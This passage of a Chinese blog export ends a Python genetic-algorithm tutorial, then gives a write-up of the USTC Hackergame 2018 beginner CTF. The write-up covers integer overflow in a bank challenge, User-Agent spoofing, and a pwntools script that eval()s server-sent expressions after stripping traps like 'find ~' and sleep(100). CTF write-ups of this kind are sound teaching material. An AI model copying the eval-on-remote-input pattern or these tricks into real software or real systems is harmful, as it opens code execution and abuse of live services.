class="token punctuation">:</span>copint<span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>mother<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>copint<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            daughter<span class="token operator">=</span>mother<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span>copint<span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>father<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>copint<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            son<span class="token operator">=</span>father<span class="token punctuation">[</span>i<span class="token punctuation">]</span>            daughter<span class="token operator">=</span>mother<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        offspring<span class="token punctuation">.</span>append<span class="token punctuation">(</span>son<span class="token punctuation">)</span>        offspring<span class="token punctuation">.</span>append<span class="token punctuation">(</span>daughter<span class="token punctuation">)</span>    <span class="token keyword">return</span> offspring<span class="token comment" spellcheck="true">#变异算子</span><span class="token keyword">def</span> <span class="token function">mutation</span><span class="token punctuation">(</span>offspring<span class="token punctuation">,</span>pm<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>offspring<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span>pm<span class="token punctuation">:</span>            position<span class="token operator">=</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#'str' object does not support item assignment,cannot use = to change value</span>            <span class="token keyword">if</span> position<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>position<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'1'</span><span class="token punctuation">:</span>                    offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span>position<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'0'</span><span class="token operator">+</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>position<span class="token punctuation">:</span><span class="token punctuation">]</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span>position<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'1'</span><span class="token operator">+</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>position<span class="token punctuation">:</span><span class="token punctuation">]</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>position<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'1'</span><span class="token punctuation">:</span>                    offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'0'</span><span class="token operator">+</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'1'</span><span class="token operator">+</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> offspring<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#通过matplotlib库绘出函数图形</span>    <span class="token comment" spellcheck="true"># plt.plot(x,y)</span>    <span class="token comment" spellcheck="true"># plt.annotate('local max', xy=(1.4, max(y)), xytext=(0, 200),</span>    <span class="token comment" spellcheck="true">#             arrowprops=dict(facecolor='black', shrink=0.05),</span>    <span class="token comment" spellcheck="true">#             )</span>    <span class="token comment" spellcheck="true"># plt.show()</span>    population <span class="token operator">=</span> Init_popu<span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span>    mean <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    X<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    Y<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    Y1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    Y2<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        population<span class="token punctuation">,</span>Dpopulation <span class="token operator">=</span> Decode<span class="token punctuation">(</span>population<span class="token punctuation">)</span>        y<span class="token punctuation">,</span>population <span class="token operator">=</span> gafunction<span class="token punctuation">(</span>population<span class="token punctuation">,</span>Dpopulation<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#print(DNAdict)</span>        new_population <span class="token operator">=</span> selection<span class="token punctuation">(</span>population<span class="token punctuation">,</span>y<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#crossover 交叉</span>        offspring <span class="token operator">=</span>crossover<span class="token punctuation">(</span>new_population<span class="token punctuation">,</span><span class="token number">0.8</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#mutation 变异</span>        population<span class="token operator">=</span>mutation<span class="token punctuation">(</span>offspring<span class="token punctuation">,</span><span class="token number">0.001</span><span class="token punctuation">)</span>        population<span class="token punctuation">,</span>Dpopulation <span class="token operator">=</span> Decode<span class="token punctuation">(</span>population<span class="token punctuation">)</span>        y<span class="token punctuation">,</span>population <span class="token operator">=</span> gafunction<span class="token punctuation">(</span>population<span class="token punctuation">,</span>Dpopulation<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#通过平均值表示迭代进化</span>        meannum <span class="token operator">=</span> np<span class="token punctuation">.</span>mean<span class="token punctuation">(</span>y<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#通过最小值表示迭代进化</span>        minnum <span class="token operator">=</span> min<span class="token punctuation">(</span>y<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#通过最大值表示迭代进化</span>        maxnum <span class="token operator">=</span> max<span class="token punctuation">(</span>y<span class="token punctuation">)</span>        X<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        Y<span class="token punctuation">.</span>append<span class="token punctuation">(</span>minnum<span class="token punctuation">)</span>        Y1<span class="token punctuation">.</span>append<span class="token punctuation">(</span>meannum<span class="token punctuation">)</span>        Y2<span class="token punctuation">.</span>append<span class="token punctuation">(</span>maxnum<span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'b'</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y2<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'g'</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y1<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'y'</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>axhline<span class="token punctuation">(</span>FuncMax<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> linewidth<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> color<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">)</span>      plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>    </code></pre><blockquote><p>参考：</p><p><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/8857950.html" target="_blank" rel="noopener">https://www.cnblogs.com/ECJTUACM-873284962/p/8857950.html</a></p><p><a href="https://blog.csdn.net/WFRainn/article/details/80458246" target="_blank" rel="noopener">https://blog.csdn.net/WFRainn/article/details/80458246</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 算法 </tag>
            
            <tag> 数学建模 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ustc-Hackergam2018</title>
      <link href="/2018/10/16/ustc-Hackergam2018/"/>
      <url>/2018/10/16/ustc-Hackergam2018/</url>
      
        <content type="html"><![CDATA[<p>……</p><a id="more"></a><h1 id="中科大-Hackergame2018-write-up"><a href="#中科大-Hackergame2018-write-up" class="headerlink" title="中科大-Hackergame2018 write-up"></a>中科大-Hackergame2018 write-up</h1><blockquote><pre><code>这个比赛主要面向新生，较为友好，链接：https://hack.lug.ustc.edu.cn/官方writeup:&lt;https://github.com/ustclug/hackergame2018-writeups&gt;此场比赛充满了猫咪与flxg（废理兴工），虽然作为一个老腊肉去做小鲜肉的题很不好意思，但该做的还是要做啦。</code></pre></blockquote><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><blockquote><p>打开<a href="http://202.38.95.46:12002/" target="_blank" rel="noopener">题目链接</a>之后，题面如下图：</p></blockquote><p>  <img src="https://i.loli.net/2018/10/12/5bc02b2fdc456.png" alt=""></p><blockquote><pre><code>Key的输入框限制了长度，通过开发者工具修改页面源码，或者抓包发送 hackergame2018获取 flag:The flag is: flag{Hackergame2018_Have_Fun!}</code></pre></blockquote><p>  <img src="https://i.loli.net/2018/10/12/5bc02bfb8a96d.png" alt="">  </p><h2 id="猫咪问答"><a href="#猫咪问答" class="headerlink" title="猫咪问答"></a>猫咪问答</h2><blockquote><p>这一题虽然表面上是对中科大新生有优势，但是实际上是个社工题。考验学生的搜索能力，信息收集能力。毕竟信安肯定是要跟这个打交道的啦。简单搜索（百度，必应，谷歌）一下，提交得到flag：</p><p>flag{G00G1E-is-always-YOUR-FRIEND} </p></blockquote><p>  <img src="https://i.loli.net/2018/10/12/5bc02da7e38a4.png" alt=""></p><h2 id="游园会的集章卡片"><a href="#游园会的集章卡片" class="headerlink" title="游园会的集章卡片"></a>游园会的集章卡片</h2><blockquote><pre><code>这一题实际上考验学生的拼图能力，只不过是花的实时间长短而已，需要注意的就是字母和数字的分辨，可能有的其他题目会需要一个前面的过程来获取到零碎的图片，再到这一步拼图。拼完图可以得到flag：    flag{H4PPY_1M4GE_PR0CE551NG}</code></pre></blockquote><p>  <img src="https://i.loli.net/2018/10/12/5bc02e508ccdd.png" alt=""></p><h2 id="猫咪和键盘"><a href="#猫咪和键盘" class="headerlink" title="猫咪和键盘"></a>猫咪和键盘</h2><blockquote><pre><code>题目是一份经过了乱序处理的代码，虽然说是乱序，但还是有一定规律的，比如说可以看出跟列有关系，某列整体移到另一个位置之类的。</code></pre><p>简单来说，要还原整个项目是不太可能实现的，所以我们需要根据出题人给我们的路，认真抉择，然后行动。比如源码首部的author，name，url等信息，可以谷歌得到项目的一部分源码，再还原一部分关键性的代码，理解逻辑即可。</p></blockquote><p>  <img src="https://i.loli.net/2018/10/12/5bc0378f2d30c.png" alt=""></p><p>  <img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc0317a3d624.png" class="lazyload"></p><blockquote><pre><code>根据name，author可以在搜到位于github的项目源码，前一部分自定义函数是相同的，主函数不同，我们还原一下ABC，BAC，CAB：ABC：FfQ47if9Zxw9jXE68VtGABAC：JDk6Y6Xc88UrUtpK3iF8pCAB：7BMs4y2gzdG8Ao2gv6aiJ根据主函数逻辑可以得到flag是像下面这样拼接的：printf(&quot;%s%s%s%s %s%s%s%s%s%s%d %s%d%s&quot;，&quot;f&quot;,&quot;l&quot;,&quot;a&quot;,&quot;g&quot;,ABC,&quot;&quot;,BAC,&quot;&quot;,CAB,&quot;}&quot;,&quot;type_printf&quot;,&quot;_&quot;,&quot;}&quot;)flag{FfQ47if9Zxw9jXE68VtGAJDk6Y6Xc88UrUtpK3iF8p7BMs4y2gzdG8Ao2gv6aiJ125type_printf92}</code></pre></blockquote><h2 id="Word-文档"><a href="#Word-文档" class="headerlink" title="Word 文档"></a>Word 文档</h2><blockquote><pre><code>这题的话主要是给新生扩充一个知识点：office套件实际上都属于zip压缩包，将后缀改为zip就能以压缩包的形式打开office文档，然后看见其文件结构。</code></pre></blockquote><p>  <img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc03a0493152.png" class="lazyload"></p><h2 id="猫咪银行"><a href="#猫咪银行" class="headerlink" title="猫咪银行"></a>猫咪银行</h2><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc03afaf3184.png" class="lazyload"></p><blockquote><pre><code>又是一通过非法获取钱财买flag的题目呢，经过简单的尝试输入后发现没什么特殊的漏洞，不能以科学计数（如 0e516516）的方式作为切入点，改cookie只能重置账户，买1/4个flag跟没买似的。</code></pre><p>​    仔细看可以发现，理财时间有下限，但是没有上限，先兑换TDSU，输一个大数试试看，oh一不小心就溢出了：</p></blockquote><p>  <img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc03c707e924.png" class="lazyload"></p><blockquote><pre><code>但是我们需要控制溢出的收益，不然收益为负，够你受的了。通过控制输入的大数的大小来调节：922337203685477500</code></pre></blockquote><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc03da7f11cd.png" class="lazyload"></p><blockquote><p>The flag is: <code>flag{Evil_Integer._Evil_Overflow.}</code> </p><p>护网杯中那个辣条之王溢出的题比较精妙，需要通过条件竞争的手法（即多线程同时购买，同一时间多次购买只需要一次付钱），再判断溢出点，从而getflag：题解 <a href="https://qingchenldl.github.io/2018/10/13/%E6%8A%A4%E7%BD%91%E6%9D%AFWP-BitPwn/?tdsourcetag=s_pcqq_aiomsg" target="_blank" rel="noopener">https://qingchenldl.github.io/2018/10/13/%E6%8A%A4%E7%BD%91%E6%9D%AFWP-BitPwn/?tdsourcetag=s_pcqq_aiomsg</a></p></blockquote><h2 id="黑曜石浏览器"><a href="#黑曜石浏览器" class="headerlink" title="黑曜石浏览器"></a>黑曜石浏览器</h2><blockquote><p>这就是那个坑到无数老少爷们，一时风头无俩的黑曜石浏览器(HeiCore)，确实出题人比较良心，为这个题目甚至专门写了一个前端页面来迷惑各位CTFer，这个黑曜石浏览器主页是在百度上不能搜索到的，在必应和谷歌上可以查到，很明显这个页面很不正经，简直是在嘲笑各位CTFer的智商嘛是不是？</p><p>好回到题目，实际上我们也做了比较久，尝试过各种方法之后回到了原点：黑曜石浏览器主页，这个主页除了假正经之外还有就是，不能查看源码，用谷歌的开发者工具看主页时会返回404。那么问题已经比较明显了，这里就是出题人的阻碍，为啥要阻碍，因为关键在这里，拿到关键的东西之后我们就可以去题目那里获取flag了。</p><p>谷歌用不了我们用火狐嘛，来看看network，看看源码：</p></blockquote><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc0424f6bfaf.png" class="lazyload"></p><blockquote><pre><code>哦嚯，获得了一个user-agent，题目页面不是需要通过黑曜石浏览器访问吗，既然我们没有黑曜石浏览器这个东西，当然也可以通过user-agent来代表我们是黑曜石浏览器的身份咯，构造请求，加上user-agnet，getflag。</code></pre><p>The flag is: <code>flag{H3ic0re_49.1.2623.213_sai_kou}</code> </p></blockquote><h2 id="回到过去"><a href="#回到过去" class="headerlink" title="回到过去"></a>回到过去</h2><pre class=" language-shell"><code class="language-shell">#input_sequenceqedaflag{.a44a2b8a3d9b2c               #关键在这一行最后的c是保留不保留c44039f93345}.2m3                    #开始换行2m52m12                    #切换到第二行s/4/t                #将当前行的第一个4替换为tqq</code></pre><blockquote><pre><code>这一题介绍了一下ed编辑器的使用，给出了一个文件如上，里面有键盘记录，实际上根据键盘记录，利用ed编辑器重写一遍就可获得flag，但是这个还是有一个坑点，那就是那个多出来的 ESC特殊符，刚开始在MobaXterm上面自带的ed做题，发现 2m3之类的换行命令无法实现，后来使用云服务器进行一波操作得到flag：</code></pre><p>flag{t4a2b8c44039f93345a3d9b2}</p></blockquote><h2 id="我是谁"><a href="#我是谁" class="headerlink" title="我是谁"></a>我是谁</h2><blockquote><pre><code>这一题有两个小题，充满哲学。考察的是客户端错误相应代码和 “递茶”协议。。。</code></pre><p>第一题通过查看network，可以看到status code里面有 <code>418 I AM A TEAPOT</code>，正好问我是谁嘛，把TEAPOT填进去，getflag1:<br>flag{i_canN0t_BReW_c0ffEE!} </p></blockquote><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc0460ef19b2.png" class="lazyload"></p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc0464a1b3a2.png" class="lazyload"></p><blockquote><pre><code>然后可以获取第二小题的链接，简单查看一下，响应如下：</code></pre></blockquote><pre class=" language-shell"><code class="language-shell">#这年头给大佬递茶都不简单了Brewing tea is not so easy.Try using other methods to request this page.#试试post请求，响应如下：The method "POST" is deprecated.See RFC-7168 for more information.#试试brew请求，响应如下：Please check if there is anything missing in your header.</code></pre><blockquote><p>结合两题的信息 I AM A TEAPOT  + brew tea + RFC-7168搜索一下，可以得到说明文档：</p><pre><code>https://tools.ietf.org/html/rfc7168</code></pre><p>根据文档构造请求header里面的Content-Type: message/teapot，发送过去得到如下信息:</p></blockquote><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc04932d86c3.png" class="lazyload"></p><blockquote><p>根据返回的信息，我们需要将构造的请求发送到另一个url,即在原url后面加上递茶类型black_tea:</p><p>/the_super_great_hidden_url_for_brewing_tea/black_tea</p><p>getflag:</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc049bab0ba3.png" class="lazyload"></p></blockquote><h2 id="家里有矿"><a href="#家里有矿" class="headerlink" title="家里有矿"></a>家里有矿</h2><blockquote><p>提示：</p><ol><li>本题的浏览器“挖矿”只为演示性目的，几乎不占资源。我们不会以任何形式盗取或浪费大家电脑的算力。</li><li>本题如果使用程序求解，对于普通配置的个人电脑，在解法正确且最优的情况下，求解程序的期望运行时间不会超过几分钟。</li></ol><p>该题并不是常规的web 题，解题过程不涉及注入、XSS、敏感文件泄露、弱类型等安全问题。 </p><p>但是我暂时不会，所以待更新。</p></blockquote><h2 id="秘籍残篇"><a href="#秘籍残篇" class="headerlink" title="秘籍残篇"></a>秘籍残篇</h2><blockquote><pre><code>从这题就开始涉及古文化，玄学知识了。这题也是一个两小题的题目，第一题给出了一段malbolge语言的代码在文件中。一个骚操作。。直接用火狐浏览器打开文件，然后调整页面大小(%30)，宽度得到以下嘲讽CTFer的图案:</code></pre><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc052d4be6b1.png" class="lazyload"><br>   ​<br>flxg{University_Ridiculous}<br>   ​<br>第二题待更新。</p></blockquote><h2 id="猫咪遥控器"><a href="#猫咪遥控器" class="headerlink" title="猫咪遥控器"></a>猫咪遥控器</h2><blockquote><p>为了报复猫咪把自己的代码打乱（见：猫咪与键盘），D 同学把猫咪遥控器绑在可以上（UP）下（DOWN）左（LEFT）右（RIGHT）移动的三轴机械臂上，开始使用树莓派（一款基于 Linux 的单片机计算机）控制三轴机械臂，进而控制猫咪在草地上跑来跑去。 </p><p>此题给出的txt文件中有 U(UP),D(DOWN),L(LEFT),R(RIGHT)，即上下左右咯，既然是让猫咪按这个跑，很简单就是画出路线图嘛，写一个简单的python脚本，利用tutle海龟库写，getflag：</p><p>flag{MeowMeow}</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">import</span> turtle <span class="token keyword">as</span> T<span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'seq.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    strings <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>strings<span class="token punctuation">)</span>T<span class="token punctuation">.</span>speed<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> strings<span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token string">'U'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        T<span class="token punctuation">.</span>seth<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span>        T<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span><span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token string">"D"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        T<span class="token punctuation">.</span>seth<span class="token punctuation">(</span><span class="token number">270</span><span class="token punctuation">)</span>        T<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span><span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token string">"L"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        T<span class="token punctuation">.</span>seth<span class="token punctuation">(</span><span class="token number">180</span><span class="token punctuation">)</span>        T<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span><span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token string">"R"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        T<span class="token punctuation">.</span>seth<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>        T<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre><blockquote><p>运行结果:</p></blockquote><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc0561d47cad.png" class="lazyload"></p><h2 id="她的诗"><a href="#她的诗" class="headerlink" title="她的诗"></a>她的诗</h2><blockquote><p>题目给了一个poem.zip，包含一个python解密脚本和一个包含加密后诗的文件。根据解密脚本可以知道是uuencode，开始过于相信这个解密脚本，没想到出题人在这儿动手脚</p><pre class=" language-python"><code class="language-python">   <span class="token comment" spellcheck="true">#!/usr/bin/env python3</span>   <span class="token comment" spellcheck="true"># This script helps you decode "her poem"</span>   <span class="token keyword">from</span> codecs <span class="token keyword">import</span> decode   fin <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"poem.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span>   fout <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"poem.out"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span>   <span class="token keyword">for</span> i <span class="token keyword">in</span> fin<span class="token punctuation">:</span>      data <span class="token operator">=</span> <span class="token string">"begin 666 &lt;data>\n"</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">" \nend\n"</span>      decode_data <span class="token operator">=</span> decode<span class="token punctuation">(</span>data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"ascii"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"uu"</span><span class="token punctuation">)</span>      <span class="token keyword">print</span><span class="token punctuation">(</span>decode_data<span class="token punctuation">)</span>      fout<span class="token punctuation">.</span>write<span class="token punctuation">(</span>decode_data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"ascii"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>   fin<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>   fout<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>   <strong>重点！在线解密密文即可得到真正的flag</strong>，flag分散藏在每行的头部，但是flag少了一个n需要自行添加在最后面补全为一个单词fun。</p></blockquote><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc057e2cd0ed.png" class="lazyload"></p><h2 id="猫咪克星"><a href="#猫咪克星" class="headerlink" title="猫咪克星"></a>猫咪克星</h2><blockquote><p>nc 202.38.95.46 12009 </p><p>蟒蛇是一种非常容易使用的编程语言，考验你像不像蟒蛇的标准就是给你一些 Python 3 表达式。如果你能正确计算出来，你就通过了验证。 </p><p>简单来说就是要在30秒内完成指定次数表达式的计算，然后可以得到服务器给出的flag，但是坑爹的是表达式中有一些特殊函数，类似于目录遍历 find ~,sleep(100),exit()，所以这种东西我采取了替换的方法。<br>​<br>因为print函数在python3和python2中不同，而我需要使用python2中的pwntools库（python3的socket不知为何无用），同时拥有python3的print函数特性，这时候就需要:</p><p>from _ _ future _ _ import print_function</p><p>引入python3 print函数。</p><p>最终脚本如下(脚本比较简陋，可能需要多跑几次才能出flag)：</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> __future__ <span class="token keyword">import</span> print_function<span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"202.38.95.46"</span><span class="token punctuation">,</span><span class="token number">12009</span><span class="token punctuation">)</span>getit <span class="token operator">=</span> sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    strings <span class="token operator">=</span> sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>    strings <span class="token operator">=</span> strings<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'sleep(100)'</span><span class="token punctuation">,</span><span class="token string">'int(1)'</span><span class="token punctuation">)</span>    strings <span class="token operator">=</span> strings<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'exit()'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>    strings <span class="token operator">=</span> strings<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'find ~'</span><span class="token punctuation">,</span><span class="token string">'echo 1'</span><span class="token punctuation">)</span>    strings <span class="token operator">=</span> strings<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"__import__('time')."</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>strings<span class="token punctuation">)</span>    key <span class="token operator">=</span> eval<span class="token punctuation">(</span>strings<span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'flag'</span> <span class="token keyword">in</span> strings<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>strings<span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre><blockquote><p>脚本运行结果如下：</p></blockquote><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc05b09d0ecf.png" class="lazyload"></p><h2 id="猫咪电路"><a href="#猫咪电路" class="headerlink" title="猫咪电路"></a>猫咪电路</h2><blockquote><p>当年玩的minercraft被做成了题目，好吧，红石电路，这是一个存档，需要我们按规律输入信号，然后直到光柱亮起，正确的信号即为flag:</p><p>flag{0110101000111100101111111111111111111010} </p></blockquote><h2 id="FLXG-的秘密"><a href="#FLXG-的秘密" class="headerlink" title="FLXG 的秘密"></a>FLXG 的秘密</h2><blockquote><p>题目有点长，我总结一下，给出的文件中是伏羲六十四卦的卦象，简单搜索一下可以知道，伏羲六十四卦可以跟二进制扯上关系，六十四卦分别对应二进制000000-111111，对应关系如下:</p></blockquote><pre class=" language-shell"><code class="language-shell">'坤': '000000', '剥': '000001', '比': '000010', '观': '000011', '豫': '000100', '晋': '000101', '萃': '000110', '否': '000111', '谦': '001000', '艮': '001001', '蹇': '001010', '渐': '001011', '小过': '001100', '旅': '001101', '咸': '001110', '遁': '001111', '师': '010000', '蒙': '010001', '坎': '010010', '涣': '010011', '解': '010100', '未济': '010101', '困': '010110', '讼': '010111', '升': '011000', '蛊': '011001', '井': '011010', '巽': '011011', '恒': '011100', '鼎': '011101', '大过': '011110', '姤': '011111', '复': '100000', '颐': '100001', '屯': '100010', '益': '100011', '震': '100100', '噬嗑': '100101', '随': '100110', '无妄': '100111', '明夷': '101000', '贲': '101001', '既济': '101010', '家人': '101011', '丰': '101100', '离': 